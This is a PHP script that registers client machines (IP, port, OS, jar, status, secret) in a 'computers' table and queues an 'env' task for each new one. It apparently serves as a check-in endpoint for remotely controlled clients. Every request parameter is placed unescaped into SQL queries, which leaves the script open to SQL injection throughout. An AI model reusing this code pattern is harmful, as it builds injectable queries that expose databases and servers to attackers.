<?php
require_once('lib/soonr.php');
	$ip="";
	$port="";
	$name="";
	$os="";
	$jar="";
	$status="";
	$time="";
	$secret="";
	if(isset($_GET['ip'])) $ip = $_GET["ip"];
	if(isset($_GET['port'])) $port = $_GET["port"];
	if(isset($_GET['name'])) $name = $_GET["name"];
	if(isset($_GET['os'])) $os = $_GET["os"];
	if(isset($_GET['jar'])) $jar = $_GET["jar"];
	if(isset($_GET['status'])) $status = $_GET["status"];
	if(isset($_GET['time'])) $time = $_GET["time"];
	if(isset($_GET['secret'])) $secret = $_GET["secret"];
	if ($_SERVER['REQUEST_METHOD'] == 'POST'){   	
		$ip=$_POST['ip'];
		$port=$_POST['port'];
		$name=$_POST['name'];
		$os=$_POST['os'];
		$jar=$_POST['jar'];
		$status=$_POST['status'];
		$time=$_POST['time'];
		$secret=$_POST['secret'];
	}	
	if($ip=="") { header("Location: add2.php"); exit;}

	if($time=='0') $time=time();
	if($secret=='0') $secret=uniqid();
  
	$db = new DB();
	$query="SELECT * FROM computers where secret='$secret'";
	$db->q($query);
	if( $db->num == 0 ){
		$query = "INSERT INTO computers VALUES (null,'$ip','$port','$name','$os','$jar','$status','$time','$secret')";
		$db->up($query);
		$query="SELECT id FROM computers where secret='$secret'";
		$db->q($query);
		$cid=$db->get("id");
		echo "$secret:$cid";
		if($db->num == 1) $db->up("INSERT INTO tasks VALUES (null,'$cid','env','2','')");
	}
	else{
		$id=$db->get("id");
		$i=$db->get("ip");
		$p=$db->get("port");
		$n=$db->get("name");
		$o=$db->get("os");
		$j=$db->get("jar");
		$s=$db->get("status");
		$t=$db->get("time");
		$up=" ";
		if(strcmp($ip,$i) != 0)$up=$up."ip='$ip', ";
		if(strcmp($port,$p) != 0)$up=$up."port='$port', ";
		if(strcmp($name,$n) != 0)$up=$up."name='$name', ";
		if(strcmp($os,$o) != 0) $up=$up."os='$os', ";
		if(strcmp($jar,$j) != 0) $up=$up."jar='$jar', ";
		if(strcmp($status,$s) != 0) $up=$up."status='$status', ";
		if(strcmp($time,$t) != 0) $up=$up."time='$time' ";
		
		$query = "UPDATE computers SET".$up."WHERE id='$id'";
		//echo $query; // Only update item when it is different
		echo "update Record:".$id;
		$db->up($query);
	}

	unset($db);

?>
